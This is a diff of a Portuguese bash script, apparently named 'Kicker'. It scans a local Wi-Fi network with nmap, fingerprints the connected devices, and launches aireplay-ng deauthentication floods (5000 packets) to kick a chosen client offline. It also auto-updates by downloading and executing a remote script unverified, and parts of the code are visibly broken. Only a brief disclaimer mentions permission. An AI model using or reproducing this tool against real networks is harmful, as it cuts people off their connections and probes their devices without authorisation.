@@ -1,4 +1,26 @@
 #!/bin/bash
+# =============[ VARIAVEIS ]=============
+	version=3.0.1
+	last_date=01/07/19
+	
+	color_red="\033[01;31m"
+	color_green="\033[01;32m"
+	color_yellow="\033[01;33m"
+	color_white="\033[01;37m"
+	
+	macs=("1" "0")
+	card_name="wlan0"
+	mac="null"
+	router_mac="" 
+	address_now="null"
+	description="null"
+	addres_description=("Desconhecido","Desconhecido")
+	RES_ADDRES=("-","-")
+	ip_to="192.168.0.1"
+
+	x=0;
+	failx=0
+# =============[ VARIAVEIS ]============= 
 function print_logo(){
         echo -e "\033[01;32m"       
         echo "
@@ -11,194 +33,309 @@ function print_logo(){
 
         "
 	echo " ==============================[ KICKER ]=============================="
-       	echo "     - Utilize apenas para fins diplomaticos !"
+    echo "     - Utilize apenas para fins diplomaticos !"
 	echo "     - 'Com grandes poderes vem grandes responsabilidades!' - Stan Lee"
 	echo "     - Script desenvolvido por: DevPG"
 	echo "     - Instagram: @pgdogas"
-	echo "     - VersÃ£o do script: 2.0"
-	echo "     - Finalidade objetiva: Expulsar intrusos com permissÃ£o do responsavel pela rede"
-	echo "obs: Certifique-se que voce tem permissÃ£o para executar esta ferramenta"
+	echo "     - Versão do script: $version"
+	echo "     - Finalidade objetiva: Expulsar intrusos com permissão do responsavel pela rede"
+	echo "obs: Certifique-se que voce tem permissão para executar esta ferramenta"
 	echo " ==============================[ KICKER ]=============================="
 	 echo -e "\033[01;35m"
 }
-clear
-print_logo
-setterm -foreground red
-echo "  [!]  Este script foi criado e testado em sistema baseado em debian, nÃ£o hÃ¡ testes realizados em outros sistemas !"
-echo "  [!]  Certifique-se de que nÃ£o tenha outra interface ligada em seu sistema"
-echo "  [!]  Para desativar uma interface momentaneamente execute: ifconfig wlanX down"
-echo "  [!]  Dependencias: nmap, aircrack-ng."
-echo -e "\n\n\n"
-echo " [...] -> Obtendo gateway padrÃ£o..."
-ifconfig | grep "inet 192" > local_ip.txt
-sed 's/inet.*broadcast/->/' local_ip.txt > local_ip2.txt
-sed -e 's/ //g' local_ip2.txt > local_ip.txt
-cut -c3-12 local_ip.txt > local_ip2.txt
-sed 's/$/0-24/' local_ip2.txt > local_ip.txt
-sed -r -e 's/[-]+/\//g' local_ip.txt > local_ip2.txt
-setterm -foreground green
-echo " [!] -> Gateway obtido!"
-setterm -foreground white
-echo " [...] -> Analisando REDE Aguarde!"
-lip=$(cat local_ip2.txt) 
+function new_logo(){
+	clear
+	print_logo
+}
+function check_version(){
+	rm version > dumps.txt
+	wget https://raw.githubusercontent.com/DevPGT/LKicker/master/version > dumps.txt
+	version_now=$(cat version)
+	if [ $version -lt $version_now ]
+		then
+			new_logo
+			" $color_red [!!!] $color_yellow Está versão do script está desatualizada ! Atualizando para nova versão:$color_green { $version_now }"
+			echo -e "
+			ping -c 2 127.0.0.1 > dumps.txt
+			mv ./kicker ./kicker_old
+			wget https://raw.githubusercontent.com/DevPGT/LKicker/master/kicker
+			chmod +x ./kicker
+			./kicker
+			" > updater.sh
+			chmod +x ./updater.sh
+			gnome-terminal -- "./updater.sh" > dumps.txt
+	fi
+}
+function recheck_dependencies(){
+	echo -e "$color_yellow [...] Realizando ultimas verificações de dependencias"
+	if [[ $(nmap | grep -c "not found") -gt 0 || $(aircrack-ng | grep -c "not found") -gt 0 ]]
+		then
+			new_logo
+			echo -e "$color_red [!] Não é possivel seguir com o script uma de suas dependencias não estão instaladas!(cut , cat , sed , grep , nmap , aircrack-ng)"
+			exit
+	fi
+	echo -e "$color_green [!] Todas as dependencias estão instaladas !"
+}
+function check_dependencies(){
+	echo -e "$color_yellow [...] Realizando verificação de dependencias"
+	apt-get install grep sed > core-depends.logs
+	if [ $(nmap -version | grep "Nmap version" | sed 's/Nmap.*on //g' | sed 's/ (.*)//g' | sed 's/ //g' | cut -c1) -lt 6 ]
+		then
+			echo -e "$color_yellow [?] A sua versão do nmap esta desatualizada deseja atualiza-la ?(S/N)"
+			read resposta
+			resposta={$resposta,,}
+			if [ $resposta == "s" ]
+				then
+					echo -e "$color_yellow [!] AGUARDE ! INSTALANDO FERRAMENTA NMAP !"
+					apt-get install nmap -fy > nmap_installer.logs
+			fi
+			echo -e "$color_red [!] Continuando o script com a versão desatualizada do nmap!"
+	else
+		echo -e "$color_green [!] Nmap version: $(nmap -version | grep "Nmap version" | sed 's/Nmap.*on //g' | sed 's/ (.*)//g')"
+	fi
+
+	if [ $(aircrack-ng | grep "Aircrack" | sed 's/  Ai.*g //g' | cut -c1-5 | sed 's/ //g' | cut -c1) -lt 1 ]
+		then
+			echo -e "$color_red [?] A sua versão do aircrack-ng esta desatualizada deseja atualiza-la ?(S/N)"
+			read resposta
+			resposta={$resposta,,}
+			if [ $resposta == "s" ]
+				then
+				echo -e "$color_yellow [!] AGUARDE ! INSTALANDO FERRAMENTA AIRCRACK !"
+				apt-get install aircrack-ng -fy > aircrack_installer.logs
+			fi
+			echo -e "$color_red [!] Continuando o script com a versão desatualizada do nmap!"
+	else
+		echo -e "$color_green [!] Aircrack version: $(aircrack-ng | grep "Aircrack" | sed 's/  Ai.*g //g' | cut -c1-5)"
+	fi
+	recheck_dependencies
+}
+function get_routermac(){
+	echo -e "$color_yellow [...] Obtendo mac do roteador"
+	router_mac=$(iwconfig $card_name| grep Access | sed -e 's/Mode.*nt://g' | grep : | sed -e 's/ //g')
+}
 function load_clients(){
+	echo -e "$color_yellow [...] Pesquisando clientes na rede $lip"
 	nmap -sP $lip > scan_out.txt
 	grep "MAC" scan_out.txt > clients.txt
 	grep "Nmap scan report for" scan_out.txt | sed 's/Nmap.*for //' > clients_ips.txt
-	cut -c13-99 clients.txt
+	#cut -c13-99 clients.txt
 	cut -c14-30 clients.txt > readmacs.txt
 }
-load_clients
-setterm -foreground yellow
-echo " [...] -> Inicializando Kicker..."
-ping 127.0.0.1 -c 3 > dumps.txt 
-macs=("1" "0")
-clear
-router_mac="" 
-function get_routermac(){
-	iwconfig | grep Access | sed -e 's/Mode.*nt://g' | grep : > lomac.txt
-	sed -e 's/ //g' lomac.txt  > mac.txt
-	router_mac=$(cat mac.txt)
+function frequency_checker(){
+	echo -e "$color_yellow [...] Chechando Frequencia da conexão"
+	if [ $(iwconfig $card_name | grep "Frequency" | sed 's/Mode:.*y://g' | sed 's/ //g' | cut -c1) == "5" ]
+		then
+			echo -e "$color_red [!] ALERTA: FREQUENCIAS MAIORES QUE 2.5GHz PODEM NÃO FUNCIONAR CORRETAMENTE!"
+	fi
 }
-get_routermac
-card_name="wlan0"
-mac="null"
-x=0; 
+function know_interfaces(){
+	echo -e "$color_yellow [...] Realizando reconhecimento de interfaces e compatibilidades"
+	for line in $(cat interfaces.txt)
+	do
+		if [ $card_name != $line ]
+		then
+			ifconfig $line down
+			echo -e "$color_green [!] Desabilitando interface $line para evitar conflitos!"
+			echo $line > up_interfaces.txt
+		fi
+	done
+	frequency_checker
+}
 function show_macs(){
-x=0
-RES_ADDRES=("-","-")
-addr_count=0
-ip_to="192.168.0.1"
-desc_count=0
-address_now="null"
-description="null"
-addres_description=("Desconhecido","Desconhecido")
-for line in $(cat clients_ips.txt)
-do
-	RES_ADDRES[$addr_count]="$line"
-	let "addr_count = addr_count + 1"
-done
-for line in $(cat clients.txt | sed 's/MA.* (//g' | sed 's/ .*)//g' | sed 's/)//g')
-do
-	addres_description[desc_count]="$line"
-	let "desc_count = desc_count +1"
-done
-setterm -foreground white
-for line in $(cat readmacs.txt) 
-do 
-	macs[$x]="$line"
-	address_now=${RES_ADDRES[$x]}
-	description=${addres_description[$x]}
-	echo -e "\033[01;37m[\033[01;33m $x\033[01;37m ] - $line \033[01;33mENDERECO_IP: -> \033[01;32m[ $address_now ]\033[01;35m - $description" 
-	let "x = x + 1"
-done
-if [ $(grep -c "." clients_ips.txt) -lt 2 ]
-	then
-		echo -e "\033[01;32m [...] -> Executando nova tentativa obter os UP HOSTS da rede..."
-		load_clients
-		show_macs
-else
-	echo -e "\033[01;33m [!] -> Clientes carregados com sucesso!"
-fi
+	x=0
+	addr_count=0
+	desc_count=0
+	for line in $(cat clients_ips.txt)
+	do
+		RES_ADDRES[$addr_count]="$line"
+		let "addr_count = addr_count + 1"
+	done
+	for line in $(cat clients.txt | sed 's/MA.* (//g' | sed 's/ .*)//g' | sed 's/)//g')
+	do
+		addres_description[desc_count]="$line"
+		let "desc_count = desc_count +1"
+	done
+	setterm -foreground white
+	echo -e "$color_green [!]$color_yellow Nome da placa: $color_white $card_name $color_yellow, Frequencia:$color_green $(iwconfig $card_name | grep "Frequency" | sed 's/Mode:.*y://g' | sed 's/ //g' | cut -c1-8)$color_yellow Endereço MAC:$color_white $router_mac"
+	for line in $(cat readmacs.txt) 
+	do 
+		macs[$x]="$line"
+		address_now=${RES_ADDRES[$x]}
+		description=${addres_description[$x]}
+		echo -e " \033[01;37m[\033[01;33m $x\033[01;37m ] - $line \033[01;33mENDERECO_IP: -> \033[01;32m[ $address_now ]\033[01;35m - $description" 
+		let "x = x + 1"
+	done
+	if [ $(grep -c "." clients_ips.txt) -lt 2 ]
+		then
+			if [ $(grep -c "$card_name" up_interfaces.txt) -lt 1 ]
+				then
+					card_name=$(cat interfaces.txt | grep -n 1 | cut -c3-7)
+					echo -e "$color_green [!] Forçando alteração de Interface para  $card_name !"
+					lip=$(ifconfig $card_name | grep "inet 192" | sed 's/inet.*broadcast/->/' | sed -e 's/ //g' | cut -c3-12 | sed 's/$/0-24/' | sed -r -e 's/[-]+/\//g')
+					ifconfig $card_name up
+					ping 127.0.0.1 -c 4 > dumps.txt
+					get_routermac
+				    ping 127.0.0.1 -c 4 > dumps.txt
+					new_logo
+					load_clients
+					ping 127.0.0.1 -c 4 > dumps.txt
+					show_macs
+			fi
+		
+			
+	else
+		echo -e "$color_green [!] -> Clientes carregados com sucesso!"
+	fi
 }
-airmon-ng stop wlan0mon
-airmon-ng stop wlan1mon
-clear
-print_logo
-echo "[?] -> Qual placa wireless usar ?(default: wlan0 / wlan0mon)"
+function get_nmap(){
+	for line in $(cat clients_ips.txt) 
+	do
+		ip_to=$line
+		echo -e "$color_red========= [$color_yellow Endereço em analise:$color_green $ip_to $color_red] =========\n$color_white"
+		nmap -O -Pn $ip_to > scan_out.txt
+		cat scan_out.txt | grep "Device"
+		cat scan_out.txt | grep "Running"
+		cat scan_out.txt | grep "OS " | sed 's/OS det.* .//g' | sed 's/(If.* ).//g'
+		cat scan_out.txt | grep "open"
+	done
+	ask
+}
+function stop(){
+	for line in $(cat up_interfaces.txt) 
+	do
+		ifconfig $line up
+	done 
+	airmon-ng stop "$card_name"mon > dumps.txt
+	clear
+	print_logo
+	setterm -foreground red
+	echo " Obrigado por usar ! espero que tenha gostado se voce experienciou qualquer tipo de problema, porfavor reporte em https://github.com/DevPGT/lkicker"
+	echo " Desenvolvido por: Gabriel TX (DevPG)"
+	echo " Instagram: pgdogas"
+	echo " Versão: $version"
+	ping 127.0.0.1 -c 5 > dumps.txt
+	clear	
+	rm readmacs.txt interfaces.txt up_interfaces.txt clients_ips.txt scan_out.txt clients.txt core-depends.logs execute.sh > dumps.txt
+	rm dumps.txt
+	exit
+}
+iwconfig | grep "ESSID" | sed 's/IE.*"//g' | sed 's/ //g' | cut -c1-5 > interfaces.txt
+new_logo
+setterm -foreground red
+echo "  [!]  Este script foi criado e testado em sistema baseado em debian, não há testes realizados em outros sistemas !"
+echo "  [!]  Para desativar uma interface momentaneamente execute: ifconfig wlanX down"
+echo "  [!]  Dependencias: nmap, aircrack-ng."
+echo "  [!]  Ainda não há testes de compatibilidade com placas de 5GHz!"
+echo -e "\n\n"
+check_dependencies
+echo -e "\033[01;33m [?] -> Qual placa wireless usar ?(default: wlan0 / wlan0mon)"
 setterm -foreground white
 read card
 if [ $card != "" ]
 	then
 		card_name=$card
-		echo -e "\033[01;33m [!] -> O nome da placa sera utilizado como: $card / ${card}mon" 
+		echo -e "$color_green [!] -> O nome da placa sera utilizado como: $card / ${card}mon"
+		if [ $(ifconfig $card | grep -c "Device not found") == 1 ]
+			then
+				echo -e "$color_yellow [!] A Interface $card não existe, foi substituida pela interface padrão ! (wlan0)"
+				card_name="wlan0"
+		fi 
 	else
-		echo -e "\033[01;33m [!] -> O nome da placa sera utilizado como: $card / ${card}mon" 
+		echo -e "\033[01;33m [!] -> O nome da placa sera utilizado como: $card_name / ${card_name}mon" 
 fi
+know_interfaces
+echo -e "$color_yellow [...] -> Obtendo gateway padrão..."
+setterm -foreground green
+echo -e "$color_green [!] -> Gateway obtido!"
+setterm -foreground white
+echo -e "$color_yellow [...] -> Analisando REDE Aguarde!"
+lip=$(ifconfig $card_name | grep "inet 192" | sed 's/inet.*broadcast/->/' | sed -e 's/ //g' | cut -c3-12 | sed 's/$/0-24/' | sed -r -e 's/[-]+/\//g') 
+load_clients
+setterm -foreground yellow
+echo -e "$color_yellow [...] -> Inicializando Kicker..."
+ping 127.0.0.1 -c 4 > dumps.txt 
+get_routermac
+airmon-ng stop wlan0mon > dumps.txt
+airmon-ng stop wlan1mon > dumps.txt
+new_logo
 show_macs
-function get_nmap(){
-	echo " [!] -> EndereÃ§o em analise: $ip_to"
-	nmap -O -Pn $ip_to > scan_out.txt
-	cat scan_out.txt | grep "Device"
-	cat scan_out.txt | grep "Running"
-	cat scan_out.txt | grep "OS "
-	cat scan_out.txt | grep "open"
-}
+y=$(($x-1))
 function ask(){
-	echo "[?] -> Escolha um cliente para deautenticar! (99 para sair)"
+	echo -e "
+$color_yellow  98)$color_white Analisar todos
+$color_yellow  97)$color_white Analisar Especifico 
+$color_yellow  96)$color_white Scanear rede novamente\n 
+$color_red  99) Sair\n
+$color_green   0~$y)$color_white Expulsar cliente escolhido"
+	setterm -foreground white
 	read ddos
+	if [ $ddos == 96 ]
+		then
+			new_logo
+			get_routermac
+			ping -c 2 127.0.0.1 > dumps.txt
+			load_clients
+			show_macs
+			ask
+	fi 
 	if [ $ddos == 99 ]
 		then
-			airmon-ng stop "$card_name"mon
-			clear
-			print_logo
-			setterm -foreground red
-			echo "=== [ Finalizando o Script ]==="
-			ping 127.0.0.1 -c 3 > dump.txt
-			clear
-			rm dump.txt
-			rm dumps.txt
-			rm execute.sh
-			rm lomac.txt
-			rm readmacs.txt
-			rm mac.txt
-			rm clients.txt
-			rm local_ip.txt
-			rm local_ip2.txt
-			rm clients.txt
-			exit
+			stop
 	fi
-	if [ $ddos == 777 ]
+	if [ $ddos == 98 ]
 		then
-			echo "[?] -> Qual EndereÃ§o voce quer analisar ? [0 ~ $x]"
+			get_nmap
+	else 
+		if [ $ddos == 97 ]
+		then
+			echo -e "$color_yellow [?] -> Qual Endereço voce quer analisar ? [0 ~ $x]"
 			read lets_get
 			if [ $lets_get -lt $x ]
 				then
 					ip_to=${RES_ADDRES[$lets_get]}
-					get_nmap
+					echo -e "$color_red========= [$color_yellow Endereço em analise:$color_green $ip_to $color_red] =========\n$color_white"
+					nmap -O -Pn $ip_to > scan_out.txt
+					cat scan_out.txt | grep "Device"
+					cat scan_out.txt | grep "Running"
+					cat scan_out.txt | grep "OS " | sed 's/OS det.* .//g' | sed 's/(If.* ).//g'
+					cat scan_out.txt | grep "open"
 			fi
-	else 
-		if [ $ddos -gt $x]
+			ask
+		fi
+		mac="${macs[$ddos]}"
+		if [ $mac == ""]
 		then
-			clear
+			new_logo
 			show_macs
-			echo " [!] -> Escolha um valor valido!"
+			echo -e "\033[01;31m [!] -> Escolha um valor valido!"
 			ask
 		else
-			mac="${macs[$ddos]}"
-			echo " [!] -> Executando ataque contra ID: $ddos -> ( $mac )"
+			echo -e "$color_green [!] -> Executando ataque contra ID: $color_red $ddos $color_yellow-> ( $mac )"
 			if [ $($router_mac | grep -c ":") == 0 ]
 				then
-					echo " [...] -> Tentando obter mac do roteador !"
+					echo -e "$color_yellow [...] -> Tentando obter mac do roteador !"
 					get_routermac
 			fi
-			clear
-			print_logo
+			new_logo
 			setterm -foreground white
-			echo " [!] -> Executando ataque contra ID: $ddos -> ( $mac )"
-			echo " [!] -> GATEWAY_MAC : $router_mac"
-			if [ $(iwconfig | grep -c "0mon") == 0 ]
-			then
-				airmon-ng start $card_name > dump.txt
-				echo " [!] -> HABILITADO MODO MONITORAMENTO PARA $card_name !"
-			fi
+			echo -e "$color_green [!] -> Executando$color_red ataque$color_green contra ID:$color_red $ddos $color_yellow-> ( $mac )"
+			echo -e "$color_green [!] -> GATEWAY_MAC :$color_white $router_mac"
+			airmon-ng start $card_name > dumps.txt
+			echo -e "$color_green [!] -> HABILITADO MODO MONITORAMENTO PARA$color_white $card_name !"
 			setterm -foreground red
-			echo " [...] -> Iniciando o ataque..."
-			ping 127.0.0.1 -c 2 > dumps.txt
-			clear
-			setterm -foreground green
-			print_logo
-			setterm -foreground red
-			echo " [!] -> Para parar o ataque pressione CTRL-C!"
-			echo ""
-			ping -c 3 127.0.0.1 > dump.txt
+			echo -e " [...] -> Iniciando o ataque..."
+			ping 127.0.0.1 -c 3 > dumps.txt
+			echo -e " [!] -> Para parar o ataque pressione CTRL-C!"
+			echo -e ""
+			ping -c 3 127.0.0.1 > dumps.txt
 			echo -e "echo -e '\033[01;31m'\naireplay-ng -0 5000 -a $router_mac -c $mac "$card_name"mon" >> execute.sh
-			chmod +x execute.sh > dump.txt
-			gnome-terminal -- "./execute.sh" > dump.txt
+			chmod +x execute.sh > dumps.txt
+			gnome-terminal -- "./execute.sh" > dumps.txt
 			setterm -foreground white
 			show_macs
 			ask
-	fi
+		fi
 	fi
 }
 ask
